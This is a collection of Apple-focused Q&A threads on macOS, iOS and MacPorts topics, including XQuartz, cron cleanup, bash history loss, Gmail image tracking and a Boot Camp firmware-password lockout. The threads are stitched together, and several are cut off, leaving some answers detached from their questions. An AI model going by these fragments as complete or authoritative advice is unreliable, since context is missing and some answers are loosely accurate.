I managed to get myself in a two-factor authentication pickle.  My Apple id is associated with a Mac (currently running OS X Yosemite), an iPhone and an iPad.\nThe iPad just came back from repair and I needed to restore it from the cloud.  Unfortunately before doing that I lost my iPhone!  I now have nothing that can receive the two-factor authentication codes.  (Didn't see that one coming!)\nMy Mac is tied to my iCloud account and Apple Id, and I see that Sierra can receive these codes and that I can upgrade from Yosemite which is what's currently running on the Macbook Pro.\nIf I upgrade to Sierra will that mean my Mac can then also receive the two factor codes (allowing me then to get my iPad back up and running)?  \nOr will I be out of luck as I may need to use two-factor to get the laptop properly set up with Sierra?  If that's the case then I do not want to upgrade as it means I may lose the limited iCloud access that I have via the Mac.\nHelp!\nN.B. Yes, have a full trustworthy backup of the Mac on Time Machine.\n\nA: You can request the two factor code to be sent to your phone number instead. Click the \"Didn't get a code\" on iPad, where you're asked to enter the code. Then you can get it sent to your trusted phone number.\nThe trusted phone number doesn't have to be an iPhone, so you can use any dumb phone that can receive SMS text messages. \n\nA: I am fairly confident that the answer to this is “No, the device is not yet trusted and updating the operating system will not change that.”\nThe reason being that having regained my phone and therefore the ability to get two factor codes I see my devices described as “trusted” with the exception of the laptop. \nIt seems unlikely that the laptop could be considered trusted until it is explicitly signed in by one of the other trusted devices. \nIf I feel brave one day I may upgrade the OS and see if that is correct. \n(Oh, and yes, lesson learned - I have added a whole bunch of extra backup numbers so I can get verification codes through multiple avenues!)\nUpdate\nThe answer is indeed “no”.

I want to bootstrap a parallel configuration with ports and boot into an i3 environment (ideally with no dock, Aqua, Finder).\n\nA: If I have understood you correctly, what you actually want to do is to get rid of the Mac graphic environment, and run a \"classic\" X11 session instead. Correct?\nI don't think you can get rid of the Mac graphic environment entirely (short of installing some other OS, like *BSD or Linux), but you can hide it to a certain extent.\nConfigure Xquartz to run in full-screen mode (it's in the settings somewhere...). This means you won't see any Mac stuff. Create an ~/.xinitrc file. Xquartz will run that file on start-up, just as would normally happen with startx or xinit. In that file, you can start any window manager you like. e.g. good old twm. (If you don't have an .xinitrc file, Quartz will start the quartz-wm window manager, which gives a \"Mac look\" to your X windows.) It should be theoretically possible to get an entire Gnome desktop running, but I have not tried that... You'll still have to boot into MacOS and log in to a Mac desktop, but after you have started Xquartz, you should be back in familiar X11 land.\n(I get the impression that you believe Xquartz is the standard graphic Mac environment. It isn't. Xquartz is an X server that runs on top of the Mac graphic environment. I think Xquartz is just a packaging of the Xorg server, built for macOS, but I could be wrong on that.)\n", "Q: What do you call the OSX Window Server, Window Manager, and Desktop Environment? In Linux we have three layers that represent the Window Server, Window Manager, and Desktop Environment. All of those three layers have more than one competing technology. I'm confused when talking about Apple products because I don't know what they call the software in their stack. I'm aware that they don't always have competing products and so I would like to know how they arrange their layers and what term I can use to refer to these Linux analogs. What is the Apple term for the technology that represents the \n\n\n*\n\n*Window Server I assume it's XQuartz? (On Linux we have X11, Xorg, and Wayland)\n\n*Desktop Environment I know there is only but what is the right name to reference it? (On Linux we have Gnome, KDE, Xfce, or i3)\n\n*Window Manager I assume this is Aqua? (On Linux we have Qt, and Gtk)\n\n\nI see a lot of terms like Aqua, Quartz, and XQuartz, and \"Core Graphics\", but I don't understand how they're organized with the traditional layers I am used to?\n\nA: macOS has implementations of the X11 protocol as you're used to on Linux. This is called XQuartz, it is based on the same Xorg as you'll find on Linux. \nYou can use many of the same desktop environments on top of macOS and XQuartz as you can on Linux. It is the exact same programs, just recompiled on macOS.\nThe terms for these things on macOS are the same as on Linux as it is the same technology (i.e. built on the X11 protocol). \nWayland is a different display protocol than X111, and is not currently supported on macOS.\nHowever note that \"native macOS apps\" do not use the X11 protocol, Xorg or anything like that. Instead they use the native Apple supplied systems. \nHere the window server is the process named simply \"WindowServer\" on a default macOS installation.\nThe \"Desktop Environment\" does not have a single counterpart on macOS rather it is a combination of multiple macOS parts - most notably WindowServer, Dock and perhaps Finder.\nRegarding the Aqua, Quartz and XQuartz: \n\n\n*\n\n*Quartz is a 2D text and graphics rendering library. There's also a Quarts GPU accelerated compositor On Linux, the counterpart 2D library is Cairo or similar.\n\n*XQuartz is simply an X11 server built on top of the Quartz rendering library.\n\n*Aqua is the name of the Apple graphical user interface. It defines the looks of widgets/controls, menus, etc. The counterpart on Linux would be something like GTK and Gnome, or QT and KDE.\n\nA: Basically they names you use are specific to X11 and OSX does not have things which match those exact components, in the same way that MS Windows or OS/2 does not have the same parts as X11. It would probably be better to try to understand the macOS architecture rather than map it to X11, it is just different.\nApple's document that show the graphics part of the OS is here \nFor X11 Window Server in macOS the nearest is Core Graphics which draw graphical components e.g. Windows on the screen but not there are also Core Text and Core Images. Xquartz is a port of X11 which uses Quartz to draw what is requested by the X11 API.\nDesktop Environment does not really exist as a separate part it is just how macOS works.\nmacOS does not have a Window server in the same way X11 does. The graphics are part of the OS.\nXQuartz is a port of X11 to run under OSX/macOS. The native macOS is in effect the window manager. Xquartz displays X11 API calls in the macOS screen.\nAqua has been used to describe how the windows look.\n\nA: The \"Desktop Environment\" is the application \"Finder\". I don't know that the window manager has a fancy name?\n", "Q: Recovering OS X partition after FFFF volume error and gpt add error I am currently running a 2014 13'' rMBP.

Is there a way to make a folder which allows me to access the items but periodically self deletes (sends everything to the trash folder) or tag them in such a way that individual files will delete themselves after a given time limit?\n\nA: Here's one that won't cost you any money :) (and not much time, either!). NOTE however, that the solution I've described below will delete these files permanently rather than sending them to the Trash folder. \nIf you prefer to send files to Trash instead of permanent deletion (using the rm shell command), there are other utilities available to do that. trash is available in Homebrew, and there are others discussed in this thread. \nAnyway, following is my recipe to permanently delete these downloaded files:\n\n\n*\n\n*Create the directory you want to use to hold your \"short-term\" files & folders: \n\n\n$ mkdir ~/Desktop/DwnLoads\n\n\n\n*Create a cron job to periodically delete the contents of the directory you just created: \n\n\n$ crontab -e\n\nYour crontab will be opened with the default editor. This will likely be vi unless you've changed it. If you don't like vi (I don't), you can use nano instead (v. ez to use). Here's how to open your crontab with nano: \nEDITOR=nano crontab -e\n\nAdd the following line to the bottom of your crontab: \n0 */4 * * * rm -rf ~/Desktop/DwnLoads/*\n\nThis particular entry will delete all files and sub-folders in ~/Desktop/DwnLoads (the DwnLoads folder on your Desktop) every 4 hours. If you want something different than 4 hours, that's easy to change. If you're not familiar with the crontab syntax, there's a great website that will take will help you developing the crontab expression you want. \nThat's it. Let us know if you have questions, and we'll try to help. \n\nA: I use hazel to set up rules for a folder.

Whenever I run uxterm under X11 it works as expected and I can get vertical and horizontal splits with i3. However, when I try to run kitty -- also installed under MacPorts, I get a terminal that opens up as if it was a native OSX application, and not one managed by the Xorg Server that MacPorts installed.\nNote, MacPorts installs i3 to /opt/local/bin, and it installs kitty to /Applications/MacPorts/kitty.app. What are the implications of these two different install paths, and can I get i3 to work with MacPorts kitty?\n\nA: The different install paths does not have a consequence here. It doesn't matter where the application is installed in terms of running under X11 or native OS X.\nkitty on macOS is a native macOS application, and is not \"managed\" by Xorg. You do not need Xquartz, Xorg or X11 at all to run kitty on macOS.\ni3 is a window manager for X11. It will only work with and affect X11 applications. You will not be able to use it as a tiling window manager for native macOS applications, such as the default kitty.\nIn order for kitty to be managed by i3 you would have to recompile kitty using an X11 backend, if that is possible. The X11 backend is already made as it is used on Linux. However it doesn't seem like the X11 backend has been tested on macOS, as the author intends the user to use the native Carbon backend.\nAnother solution would be to install a macOS tiling window manager such as chunkwm with skhd. That window manager would then be able to tile windows of both native macOS applications as well as the ones managed by XQuartz for example.\n", "Q: 2017 Macbook pro 13 inch 3 monitors help I have done quite a bit of searching and haven't found a solution to my issue.

I need to permanently delete Bluetooth and Network drivers (Wi-Fi and Ethernet) from my MacBook Air running macOS High Sierra, so there will be no way to have any connection except the USB.\nIs that possible to do from csrutil and if yes, how?\n\nA: Note: this is not a direct answer to your question, but provides some alternative points to investigate.\nWithin the strict definition of 'permanently', anything software is typically undoable with enough intention (e.g. boot from alternative media or operating system, or single user mode, reinstall or enable drivers, etc). Leaving USB accessible will not prevent a USB to ethernet adaptor or wireless adaptor from being installed given enough motivation.\nDepending on the model of your MacBook, you may be able to pop the lid open and physically remove the wireless & Bluetooth adaptor. I suspect the ethernet will be soldered to the mainboard so hardware disabling might not be practical. Some non-conductive resin in the ethernet socket might solve that issue…but the USB to network adaptor will still be an available route.\nTo summarise, it depends on your interpretation of 'permanently', and to an extent the underlying reasons for wanting/needing to do this.\n", "Q: Building webkit2-gtk with macports, errors sys/types not found Trying to build webkit2 with macports, I get \n:info:build /usr/bin/cc -c  -I/opt/local/include -fno-common\n-DPERL_DARWIN -mmacosx-version-min=10.14 -pipe -Os -isysroot/Applications/Xcode.app/Contents/Developer/Platforms/MacOSX.platform/Developer/SDKs/MacOSX10.14.sdk\n-fno-strict-aliasing -fstack-protector-strong -I/opt/local/include -DPERL_USE_SAFE_PUTENV -m64 -O3   -DVERSION=\\\"1.85\\\" -DXS_VERSION=\\\"1.85\\\"  \"-I/opt/local/lib/perl5/5.28/darwin-thread-multi-2level/CORE\"   SSLeay.c :info:build clang: warning: no such sysroot directory: '/Applications/Xcode.app/Contents/Developer/Platforms/MacOSX.platform/Developer/SDKs/MacOSX10.14.sdk' [-Wmissing-sysroot] :info:build In file included from SSLeay.xs:141:\n:info:build /opt/local/lib/perl5/5.28/darwin-thread-multi-2level/CORE/perl.h:684:10:¡™ fatal error: 'sys/types.h' file not found \n:info:build #include <sys/types.h>\n:info:build          ^~~~~~~~~~~~~ \n:info:build 1 error generated. :info:build make: *** [SSLeay.o] Error 1\n\nIs sys/types.h provided by netports, or a third party POSIX-compat package?\n\nA: Your problem is that you have specified a non-existent sysroot directory.\nCurrently you have specified the following:\n/Applications/Xcode.app/Contents/Developer/Platforms/MacOSX.platform/Developer/SDKs/MacOSX10.14.sdk\n\nThis is usually due to either not having Xcode installed, or having it installed in the wrong version. Even if Xcode runs, it may not be \"installed\". Check that the App is in /Applications, if not drag it from wherever you extracted the .xip into the Applications directory.\nIn your case, I would suggest installing Xcode, if it's not already installed, or update it to the latest version to get the 10.14 SDK.\nIf you're willing to update Xcode for some reason, you can change your sysroot to match the older version of Xcode like this:\nApplications/Xcode.app/Contents/Developer/Platforms/MacOSX.platform/Developer/SDKs/MacOSX.sdk\n\nThis path points to the latest installed SDK versions.

This is the second time it's happened.\nI just tried grep-ing some historical commands and came up empty. a look at my bash history shows that it's practically empty. Like it's been wiped clean.\nI use iTerm2 and on MacOS 10.13.6.\nI see there's a .bash_sessions directory with some sessions saved but I guess this is probably an iTerm2 thing to preserve sessions for some reason or another.\n\nA: There can be multiple reasons as to why this happens - I'll try to outline how it works below. \nHowever, I can say that the other answer you have received here is not correct. HISTFILESIZE and HISTSIZE will not cause your history to \"sometimes\" being entirely wiped out or almost wiped out. Only by setting them to 0 you would get nothing in the files - but it would happen every time, and not by chance. In addition, what you describe with the file being \"almost wiped out\" cannot happen due to it being set to 0.\nYou're actually on to the right thing yourself by mentioning .bash_sessions. That is not an iTerm2 \"thing\", but rather how it works by default on a standard macOS install. Apple has built-in per-session history on top of a regular bash install.\nThis means that if you have multiple terminals running (for example multiple tabs), each of those will have a seperate history tracked in .bash_sessions. If you reboot your Mac and the terminal windows are restored, you'll find that each still have their own history - and only their own history.\nWhen you close down a bash session, Apple's system will merge the history for that specific session into the global .bash_history file. Then when you open a new terminal (and thus bash session), it will start with that merged history containing history from potentially multiple sessions.\nThis is all handled by the /etc/bashrc_Apple_Terminal script.\nNow that you know how it works, here are some possible causes for what you're seeing:\n\n\n*\n\n*You may accidentially have removed the history yourself (history -c)\n\n*Your Mac could be infected with malware and/or hacked, and someone else is removing your .bash_history file\n\n*You have software installed that periodically empties/removes .bash_history\nThese reasons are not that likely, I would say.\nNow there's one last possible cause:\nThere's a known race-condition in handling the bash histories. If you close down multiple bash sessions at once (for example closing down a terminal window with multiple tabs), you might loose part of or the whole history. \nThis happens if the computer is \"slow\" while reading/writing parts of the history. Basically how it works is that your currently history is read, the file is deleted/moved away, and a new file is created, where all the history lines are written to. If this process is running multiple times at the same time, you might see that one process removes the old history, the other process read an empty history, then the first process writes out the whole history again, and then the other process deletes that and writes out a very short history containing only few recent lines - as it didn't read anything in. This bug shows up as exactly what you have described.\nThe fix is simply to close one bash session at a time to let the system have time to write out everything correctly.\n", "Q: Why are my iTunes factory equalizer presets all flat? If I try to select any iTunes equalizer preset, they're all flat. This includes the factory ones.\n\nHow do I get them back?\n\nA: If you have your iTunes audio output set to go to an AppleTV, it will display all presets as flat. Change it to another setting, and the currently-selected equalizer preset will still display as flat. Choose a new equalizer preset, and it will look fine.\nOur ATV is called \"Living Room\". So in the example here, I would choose \"Computer\", then choose a new equalizer preset, and it will work fine.\n\n", "Q: Can I tell MacPorts to build against its own X11 or Xorg? In this comment there is a distinction drawn between \"native macOS libraries\" and X11,\n\nHaven‘t used MacPorts for years, but most probably Kitty is compiled with the native macOS libraries, not with X11. So you need to either use an X11 version of kitty (if MacPorts has something like that), or compile it yourself with X11 support enabled. – nohillside♦ 7 hours ago \n\nIs it possible to target either of those within MacPorts? Or is the port package defined for just one?\n\nA: No, there's no such possibility within MacPorts. This port does not come with such a choice.\nkitty is based on OpenGL, and doesn't really use ordinary UI controls from a library such as GTK, QT, Aqua or similar.\nkitty is a native Mac-application, as well as existing as a native Linux application. When you compile kitty on a Mac, the backend used is Cocoa (i.e. native Mac). X11 does not come into the picture at all.\nYou could try manually recompiling kitty and then force it to use its X11 backend. I don't think that backend has been tested on macOS though, as the author intends the user to use the native Carbon backend.\n", "Q: Can I delete a file from being shown in the 'recents' area of the Files iOS app? I am trying to remove some files out of the 'recents' view of the files iOS app without actually deleting the file. \nMy 'recents' list is currently too long, for this view to be of any help for me at this point. Ideally, I can curate individual items that aren't relevant and keep the rest of the list, but if needed - can I just purge all recents and start cleanly?\n\nA: *\n\n*No - you can't edit or suppress one item - just open new files and the one that's current will be less recent.\n\n*Yes - You can wipe all the items and start fresh.\n\n\nOpen the Files app. Go to Browse tab. You'll get a list of the Locations you've authorized Files to access: iCloud, Google, etc. Your Recents tab displays recently viewed files from any authorized drive - not just iCloud.\nTap the three dots \"...\" in the upper right hand corner of the screen and select \"Edit\" from the popup menu that will appear.  To clear the Recents view for any drive turn access off by tapping the Green Button. This clears the Recents view. You can then turn access back on by tapping the button again.  A little kluggy but it works.\n\nA: No. \"Recents\" is just all your files sorted by most recently used. So if you have a file in Files.app, it will appear there. \n\nA: Natively: iPad OS and iOS does not allow you to remove/hide files from the “Recents” section in the native file app.\n1st work around (any file)\nFor when you are trying to prevent files from showing up in the recents section.\n\n\n*\n\n*Create a folder in the “On my [device here]“ tab\n\n*Move all the files that you want to remove from “Recents” into the folder you’ve created. \n\n*Long press the folder, and select compress. \n\n\nThis will create a duplicate of the original folder with all the files that you’ve placed inside as a .zip file. \n\n\n*Delete the original folder that was not compressed \n\n\nThis will not immediately delete the folder and will instead be moved into “Recently Deleted” in case you want to recover your file. (This also removes the folder and its contents from the recents section, so technically you could view the files from “recently deleted” without anything appearing into Recents even after you restore it after viewing the contents).\n\n\n*Tap on the compressed file and it will export a duplicate of the original compressed folder. None of the files inside the exported folder will be listed in the “Recents” section until viewed again. \n\n*After viewing the contents, assuming no files were added or modified (if files were added, start from step 1), delete the uncompressed folder, and uncompress the zip file. Rinse and repeat as needed. \n\n\n2nd work around (images, GIF’s, videos only):\nThis work around is for images, GIF’s, and videos specifically. \n\n\n*\n\n*Separate all the files into a folder as you would in work around 1. \n\n*Select all the sorted images  \n\n*Tap “share” and press “Save Image(s)”\n\n*Delete the folder containing all the images/videos\n\n\nAgain this will not immediately delete the files/folder and you can recover them if you so please. \n\n\n*Open the native Photos app\n\n*Select all the images that you would like to hide \n\n*Press Share, and tap the “Hide” option\n\n*Go into the “Albums” section and go into the “Hidden” album. \n\n\nThis will remove all the images from being viewable in the photos app or any other application. Unless unhidden, all images will be restricted to just the “Hidden” album. \n\nA: AFAIK this is still not possible. To remove the recent files just use the menu item at the end of the list.\n\nA: Yes\n!this works for me....\nStart composing a new email. Doesn’t matter to whom. In the body of the email click to display a menu bar. Select “insert photo” and/or “insert file” and the recents list will display. Long press any file to display actions menu, and select delete.

The right side shift does not work, but the left side shift command button will. The trackpad will click, but it stopped working to move the cursor around.\nThe trackpad works perfectly if I start up computer using Command-D, so for the 2 minutes it takes for the diagnostic test to complete I can move the cursor using the track pad, so it is not the hardware. Today I did not have my mouse near my computer to be able to choose my user at startup so I just pressed the arrow key on the keyboard and it moved my cursor over to my user icon for me to sign in.\nThis shows me that something is telling my computer to listen to the keyboard and not the trackpad.

It's main goal is to allow you to share your photos and documents between all devices signed-in with the same Apple ID.\nYou can either not sign-in to a device with the same Apple ID, create a new, different Apple ID for the device you don't want your photos (which create problems if you do want to share other documents), or not use iCloud for your photos.\n\nA: Turning off my photo stream in photos settings can do this but only for 30 days.\nhttps://support.apple.com/en-in/HT205743\n", "Q: What is the security model of iCloud Drive on iOS? \n*\n\n*If I open a file using the file picker in an app, can the app now see all files in that folder?\n\n*Is there any other way in which an app might see all the files in my iCloud Drive?\n\n\nA: UIDocumentPickerViewController provides apps with open or import access to one or more user-specified files.

I have tried having 4 GiB and 8 GiB allocated for the guest.\nHowever, if anyone is curious, these are the specifications for my host hardware:\n  Processor Name:   Intel Core i7\n  Processor Speed:  2,6 GHz\n  Number of Processors: 1\n  Total Number of Cores:    4\n  L2 Cache (per Core):  256 KB\n  L3 Cache: 6 MB\n  Memory:   16 GB\n\n\nA: Are you sure it isn't a graphics configuration issue?\nYou mentioned both that the GLXGears window moves slowly and that the mouse cursor lags.\nTry disabling all forms of graphics acceleration.\nIs the \"guest\" running slowly or just the graphics? \n", "Q: \"arp -a\" output differs on computers attached to the same network When I type arp -a I get all devices on the local network, right? My question is this: how come when I type this command on two separate machines, I get two different results? \nAnd when I ping the router not all devices ping back? I know that the ones that didn't ping back are in fact online.\n\nA: arp -a does not list all devices on the local network, just those that this computer happens to know the IPv4 and MAC addresses for. Each computer collects these IP <-> MAC pairs for other computers as it communicates with them, and remembers those pairs in its ARP cache; but the cache will only list other computers that this computer happens to have communicated with. The arp -a command just lists the content of the cache.\nYou can fill in gaps in a computer's ARP cache by forcing communication between them. Suppose your computer is missing an entry for 10.0.0.78 (and that's on the local network). Just run ping 10.0.0.78, your computer will go out and discover the corresponding MAC address, and if you run arp -a again it should now have an entry for 10.0.0.78.\nI don't understand the part of the question about ping -- are you pinging computers from the router, or pinging the router from the computers? Is there a pattern to which respond and which don't? Are some of the computers running firewalls?\n", "Q: What can an Apple Watch do beyond what an iPhone can already do? I'm fairly invested in the Apple system of devices (Mac at home/work, iPad for fun, iPhone always on me) but I'm still struggling to see the value proposition of the Apple Watch. It just doesn't seem like it adds anything beyond what I already use my iPhone for.\nI went to the nearest Apple Store and asked this question, but the answer I got was quite unsatisfactory. I was told that it can track my steps, but the iPhone has already done that since 2013 with the M7 chip. I was told it can track my activity, but I already do that with Strava. I was told it can track my heart rate, but I already do that with a bluetooth band connected with my phone.\nSo really, does the Apple Watch do anything that an iPhone doesn't already do?\n\nA: It fits on your wrist and has haptic vibrations and can read your heart rate and gets superior physiological readings from it’s accelerometer since it’s closer to your body in general than an iPhone can ever be.\nIt also forces developers to really think deeply about when and how it presents information. It’s a crucible for what you might need to know at any one point in time. It reinforces Siri and clear UI decisions since it’s so constrained for space.\nAdditional features the watch has that iOS does not are fall detection and the ability to run watchOS apps and complications. ECG readings and far better workout data collection are also a direct result of watchOS features and the physical proximity of the watch being superior to an iPhone or custom hardware being present only on the watch.\n\nA: My Apple watch allows me to see the time without having to reach into my bag and dig for my phone.\nIt allows me to track my exercise when I'm swimming and my phone would be ruined by the water.\nIt notifies me when it's time to take a break from work through its activity monitor. Good for RSI sufferers with desk jobs.\n", "Q: Is it possible to temporarily skip media restore in WhatsApp? I use WhatsApp on an iPhone X. I have chat history and media backed up on my iCloud. The total size of the backup is around 6 GB.\nI had to send in the iPhone X for repair, and I’m using a temporarily loaned iPhone 6.\nI restored the WhatsApp chat history from iCloud, but the iPhone 6 is a 16 GB variant. I’m unable to restore the media onto this phone since “system files” are around 11 GB. If I turn off iCloud Drive, it goes down to 7 GB but with that turned off, I can’t backup/restore WhatsApp. The only thing enabled in iCloud Drive is WhatsApp so I don’t know why it’s consuming 4GB on the phone when I haven’t restored media.\nIs WhatsApp backup cumulative?\n\n\n*\n\n*If I skip the media restore, and continue backing up the chat history, will I be able to restore the entire chat history and media on my iPhone X when I get it back?\n\n*Will the media part of the backup be erased from iCloud if I skip media restore and do a chat history backup on the temporary phone?\n\n\nA: The important thing is that you restore the backup on the iPhone 6. Once restored, it disables the backup of that iPhone 6 so that it does not replace the original copy of the iPhone X. Then when you have your iPhone X again, you will be able to restore the copy original.\nOn the other hand I recommend that you make a backup in iCloud of all the content and a backup in iTunes.\n", "Q: Transfer media files from an Android device to an iOS device Is there any software or app that can directly transfer media files (videos, images, audio) from an Android device to an iOS device (similar to AirDrop)?\n\nA: While there's no native way to transfer media files from Android device to iOS, you can install and use a 3rd party app called Xender to do so.\nSince iOS doesn't provide direct access to file(s) and filesystem (unlike Android), the media will be transferred via the app and the same needs to be installed on both the devices.\n", "Q: After latest Safari update, bank websites don't recognize my computer or autofilled name+pwd I'm running 10.13.6 on a late-2014 MBP.   After the latest Safari update (to 12.1), bank websites don't recognize my computer and/or autofilled user name+password.  Facebook says it doesn't recognize my browser, so it asked me to implement the second-half of two-factor authentication; I did this, and can now login to that site.  \nI don't have this issue logging into lower-security websites, like discussion forums, nor with sites for which I have a persistent login (i.e., those I can use without needing to re-login).\nIs this standard behavior following a browser update, such that sites suspect I'm using a different computer or browser?  I don't recall this happening with previous Safari updates (but maybe it did and I simply don't remember).\n\nA: Try launching Keychain Assistant.\nFind the password for the site in the Passwords section.\nJust double-check that the password is correct if you enter it manually.\nI haven't had Safari/Keychain forget a password, especially a financial password, since I became a Mac convert in 2010, across many machines/devices and OS upgrades.\n", "Q: Which iPhone app is connecting to e.crashlytics.com? My iPhone tries to connect to e.crashlytics.com several hundred times a day (and this is just the time it is connect to my wifi), according to my Pi-hole.\nHow can I identify the app that tries to establish this connection?\n\nA: Crashlytics is a service to collect crash data. It is part of googles firebase service. Depending on ones views on privacy this is or is not necessarily a bad thing. It is used by lots and lots of apps. You can try to enable developer mode for the iPhone and access the logs on the device. \"Guestimating\" right now I would say, that a good two digit percent amount of your apps will use firebase and crashlytics, so it is hard to give an answer without a network dump or logs. \n", "Q: Command + Tab sometimes does not switch to maximized window of app in another Space An app (such as Firefox) is opened and maximized on another Space. I'm on a separate Space, and then when I hit Command + Tab, to switch to Firefox, I can see its menu is displayed at the top of the screen, but it does not switch to the corresponding Space, and I can't see the app window.\nIs there a way I can achieve the desired?\n\nA: On your Mac, go to System Preferences → Mission Control and see if When switching to an application, switch to a Space with open windows for the application setting is enabled.\n\n", "Q: How can I boot back to Mojave from Boot Camp 6 with password-locked boot manager? The situation is as follows:\nI have a MacBook Air 13\" (early 2015), which was corporate but the employer allowed me to buy it when I was changing jobs. I have installed Windows 10 from an official ISO, using Boot Camp Assistant. Everything went smooth, but now I can't boot back to macOS. \nWindows Boot Camp helper can't find the macOS boot partition (AFAIK Boot Camp 6.0 doesn't support APFS). Booting into Boot Manager won't work because there is a password in place (didn't even bother touching it for years, didn't know it was there). I've tried installing Boot Manager 6.1 (which is told to have APFS support) using brigadier, but brigadier downloads 6.0 no matter what I try to do. \nI have no means of contacting my previous employer and I have no proof of buying this Mac.\nIs there anything I can do to boot back to macOS and/or fix the boot order?\n\nA: I did some research online, and the only ways I found to bypass the firmware password include booting to the recovery partition (which you already tried and it didn’t work) or some trick involving removing and reinstalling the RAM (not an option on your hardware). So here are my suggestions to resolve the issue:\n• You said you have no solid proof of ownership. Can you change that?  Assuming the people you bought it from are honest, they hopefully will be willing to send you an official document showing that you purchased the machine and then take that to Apple to have them remove the password. That would probably be the easiest way. Even if they aren’t willing to provide you with the documentation, you might still be able to get help from Apple, but I wouldn’t count on it. \n• If you’re in an area where it’s possible to purchase insurance on mail/shipments, consider asking your old IT admin if he’s willing to remove the password if you ship it to him. Again, assuming these are honest folk, it stands to reason that they would be willing to oblige you. I would strongly suggest offering to reimburse all return costs  (and maybe a little extra for their time) to minimize the impact on their end. \n• In an absolute worst-case scenario, you can continue to use your machine with Windows, and the APFS container will stay exactly as it is.  You will need to purchase another MacBook if you want to run macOS again, but assuming you get the same model you can get a screwdriver that allows you to open the machine and physically move the old SSD into the new machine and regain access to everything*. Or you can purchase software that allows you to mount the APFS container on Windows so you can recover your files if you don’t have a backup. As a starting point, check out the free trial of Paragon APFS for Windows.\n*If you’ve already activated Windows, you’ll need to migrate your product key to the new hardware.\n\nA: I faced a similar situation of being stuck in Windows without knowing the firmware password (company computer) or having BootCamp Assistant installed (so that I could click the diamond and go directly to \"reboot with MacOS\") or using Brigader (last updated 2016) to obtain Boot Camp Assistant.\nSearch for Computer Management in the windows search bar. Click Disk Management on the left bar under Storage. From there, right click and open the OSXReserved Volume. Search for the BootCamp Installer and that will let you download Bootcamp to allow you to go back to MacOS!\n", "Q: My MacBook Pro doesn’t wake up after sleep mode I have a MacBook Pro 13\" (2013). After it goes into sleep it does not wake up. I see the tabulator key light goes on if I press it, but the monitor stays black. I can only restart the Mac by pushing the on/off key.\n\nA: In cases like this you should try to do a PRAM and an SMC reset. You can see how to do that here and here. Don't worry you won't loose any data. \n\nA: I had this problem and did everything everybody recommended, including a clean reinstall. I found a workaround- Empty the Caches daily or every other day. Turn on Enable the Develop Menu\nChoose Safari > Preferences, and click Advanced.\nAt the bottom of the pane, select the “Show Develop menu in menu bar” checkbox.\nI do not know why this works but it does for me. And if I forget to empty the cache for an extra day I have the gray screen is back. \n", "Q: Pipe Terminal Output To Notification, If Output Contains Specific Phrase? I have a long series of commands that I run on a semi-regular basis. Sometimes, completion of the commands requires user input via password prompt or other responses and sometimes information is output in the course of these commands that I need to copy to a log elsewhere. Mostly, though, the script can run unattended as it processes its lengthy series of tasks.\nI've come across dozens of scripts and tools that will tell you when your command has finished running. But that's not what I need. And I've come across tools that should be able to convert varied output into a notification, but there's no accompanying documentation explaining how to do this.\nSo, if I wanted to be sent a banner notification through Notification Center every time the phrase \"space cats\" was output during the running of my command, how would I trigger that notification to be sent?\n\nA: If I understand you correctly, you can access the output of your scripts. Then you can do something like this:\n#!/bin/bash\n\n# Replace the echo with your script\necho \"space cats\" | grep \"space cats\"\n\nif [[ \"$?\" -eq \"0\" ]]; then\n    osascript -e 'display notification \"Attention!\" with title \"Notification\" subtitle \"I found space cats\" sound name \"Submarine\"'\nfi\n\n", "Q: Safest way to activate a \"backup\" iPhone, to be kept on a lower version of iOS I have a Jailbroken iPhone 6S on iOS 12.1.1, and I am really, really happy with my current setup. I want to stay on this version of iOS for as long as I possibly can—several years at minimum.\nI have taken the somewhat drastic step of purchasing a \"backup\" iPhone SE from Apple, which I will keep on (the lowest possible version of) iOS 12, in case anything happens to my primary iPhone.\nI've heard stories of Apple not allowing activation on iPhones with too old a firmware, so I assume I should activate my new SE as soon as it arrives. If I use my primary phone's SIM card to activate the SE, is there any chance of my primary phone becoming deactivated? Are there any other risks I should be aware of?\n\nA: Don't worry , you can use the SIM card to activate the iPhone SE.\nYou can always make backup copies, regardless of the iOS version you have. An important fact is that in order to restore an old version, the version you are going to restore must still be signed by Apple. Normally they leave the 2 most recent versions available, in these moments iOS 12.2 and iOS 12.1.5.\nYou do not have to worry, they will not remove the Jailbreak or anything like that by activating another iPhone.\n", "Q: ChunkWM suggests cding into directory that does not exist ~/Library/LaunchAgents When trying to install chunkwm, with MacPorts, I'm getting an instruction to,\n\n\n  \n*Symlink prepared agent and start it:\ncd ~/Library/LaunchAgents\nln -s /opt/local/Library/LaunchAgents/com.koekeishiya.chunkwm.plist\nlaunchctl load -w ~/Library/LaunchAgents/com.koekeishiya.chunkwm.plist\n\n\nHowever, I don't have a ~/Library/LaunchAgents. What do I do? I know I can create the directory with mkdir, but  I have no idea what that directory structure entails. My LaunchAgents in it /System/Library/LaunchAgents.

The page linked above interestingly does not say:\n\n\"Sometimes, senders may know whether you've opened an email that has an image.\" \n\neven though the \"Computer\" tab on that page does. I can't tell whether this implies that Gmail opens are NOT trackable in iOS.\n\nA: As of Sep 3, 2019, version: 6.0.190811, you can Choose to be asked before external images are displayed automatically.\n\nTo enable this for new incoming messages, go to Settings > specific account > Images and select Ask before displaying external images.\n\n\nGmail App - Account Settings - General\n\n\n\n\nA: UPDATE: you can now prevent opening images automatically! See @vincentlee's answer.\n\nThe documentation linked, says:\n\nImages will always appear in the Gmail app on your iPhone or iPad.\n\nMeaning there is no way to block showing images when opening a new email in Gmail on iOS - therefore you can't prevent tracking.\nHere are some workarounds that I use:\n\n\n*\n\n*Send the message to spam (using the checkbox), where images aren't loaded, view the email there, and then move it back to inbox (if desired) and archive/delete from there.\n\n*Use the built-in Mail app to specifically view the message which you don't want tracked and turn off \"Load Remote Images\" in \"Settings\" - \"Mail\".\n\n\n\nIssue with Mail: If you're concerned about tracking and want to leave remote image loading on, Gmail is better as you may archive/delete an email in Mail and automatically be taken to the next email - resulting in the images being loaded.

Supposedly the bin/sh shell that is the default root shell is not strictly a \"bash\" shell, but is a POSIX compliant equivalent.

But why doesn't sudo su?\n\nA: Your information is incorrect. /bin/sh on macOS is actually a real bash shell. The manual you have found is for a Windows program that \"mimics\" a Linux environment on Windows. It doesn't have anything to do with macOS.\nThe profile files for bash are:\n\n\n*\n\n*/etc/profile\n\n*~/.bash_profile\n\n*~/.bash_login\n\n*~/.profile\n\n\nNote that ~ and $HOME are the same thing. They both mean that it refers to the user's home folder.\nThe problem you're seeing is because you're using the command sudo su. This means that you use sudo to start su in order to get an interactive non-login shell.

